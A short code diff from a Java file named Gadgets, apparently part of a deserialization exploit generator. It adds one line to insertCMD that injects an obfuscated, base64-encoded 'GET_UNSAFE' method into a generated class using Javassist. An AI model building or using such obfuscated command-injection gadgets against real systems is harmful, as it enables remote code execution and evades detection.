@@ -483,6 +483,7 @@ public class Gadgets {
 	public static void insertCMD(CtClass ctClass) throws Exception {
 
 		if (IS_OBSCURE) {
+			ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_UNSAFE), ctClass));
 			ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
 			ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
 			ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
